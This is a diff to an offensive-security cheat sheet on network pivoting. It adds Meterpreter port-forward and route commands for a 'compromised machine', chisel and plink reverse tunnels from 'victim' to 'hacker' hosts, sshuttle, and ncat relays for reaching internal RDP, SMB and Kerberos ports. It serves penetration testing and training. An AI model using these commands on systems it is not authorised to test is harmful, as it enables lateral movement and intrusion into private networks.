@@ -1,5 +1,26 @@
 # Network Pivoting Techniques
 
+## Summary
+
+* [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
+* [SSH](#ssh)
+  * [SOCKS Proxy](#socks-proxy)
+  * [Local Port Forwarding](#local-port-forwarding)
+  * [Remote Port Forwarding](#remote-port-forwarding)
+* [Proxychains](#proxychains)
+* [Web SOCKS - reGeorg](#web-socks---regeorg)
+* [Metasploit](#metasploit)
+* [sshuttle](#sshuttle)
+* [chisel](#chisel)
+* [Rpivot](#rpivot)
+* [plink](#plink)
+* [ngrok](#ngrok)
+* [Basic Pivoting Types](#basic-pivoting-types)
+  * [Listen - Listen](#listen---listen)
+  * [Listen - Connect](#listen---connect)
+  * [Connect - Connect](#connect---connect)
+* [References](#references)
+
 ## Windows netsh Port Forwarding
 
 ```powershell
@@ -42,6 +63,7 @@ ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
 
 ```bash
 ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
+ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
 ```
 
 ## Proxychains
@@ -83,14 +105,62 @@ optional arguments:
 
 ## Metasploit
 
-```c
-portfwd list
+```powershell
+# Meterpreter list active port forwards
+portfwd list 
+
+# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
+portfwd add –l 3389 –p 3389 –r target-host 
+portfwd add -l 88 -p 88 -r 127.0.0.1
 portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
+
+# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
+portfwd delete –l 3389 –p 3389 –r target-host 
+# Meterpreter delete all port forwards
+portfwd flush 
 
 or
 
-run autoroute -s 192.168.57.0/24
+# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
+run autoroute -s 192.168.15.0/24 
 use auxiliary/server/socks4a
+
+# Meterpreter list all active routes
+run autoroute -p 
+
+route #Meterpreter view available networks the compromised host can access
+# Meterpreter add route for 192.168.14.0/24 via Session number.
+route add 192.168.14.0 255.255.255.0 3 
+# Meterpreter delete route for 192.168.14.0/24 via Session number.
+route delete 192.168.14.0 255.255.255.0 3 
+# Meterpreter delete all routes
+route flush 
+```
+
+## sshuttle
+
+Transparent proxy server that works as a poor man's VPN. Forwards over ssh. 
+
+* Doesn't require admin. 
+* Works with Linux and MacOS.
+* Supports DNS tunneling.
+
+```powershell
+pacman -Sy sshuttle
+apt-get install sshuttle
+sshuttle -vvr user@10.10.10.10 10.1.1.0/24
+sshuttle -vvr username@pivot_host 10.2.2.0/24 
+```
+
+## chisel
+
+
+```powershell
+go get -v github.com/jpillora/chisel
+
+# forward port 389 and 88 to hacker computer
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
 ```
 
 ## Rpivot
@@ -127,6 +197,7 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 ```powershell
 plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
 plink -l root -pw mypassword 192.168.18.84 -R
+plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445
 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
 ```
 
@@ -154,7 +225,7 @@ unzip ngrok-stable-linux-amd64.zip
 | Listen - Connect  | Normal redirect.                            |
 | Connect - Connect | Can’t bind, so connect to bridge two hosts  |
 
-## Listen - Listen
+### Listen - Listen
 
 | Type              | Use Case                                    |
 | :-------------    | :------------------------------------------ |
@@ -163,7 +234,7 @@ unzip ngrok-stable-linux-amd64.zip
 | remote host 1     | `ncat localhost 8080 < file`                |
 | remote host 2     | `ncat localhost 9090 > newfile`             |
 
-## Listen - Connect
+### Listen - Connect
 
 | Type              | Use Case                                                        |
 | :-------------    | :------------------------------------------                     |
@@ -172,7 +243,7 @@ unzip ngrok-stable-linux-amd64.zip
 | remote host 1     | `ncat localhost -p 8080 < file`                                 |
 | remote host 2     | `ncat -l -p 9090 > newfile`                                     |
 
-## Connect - Connect
+### Connect - Connect
 
 | Type              | Use Case                                                                   |
 | :-------------    | :------------------------------------------                                |
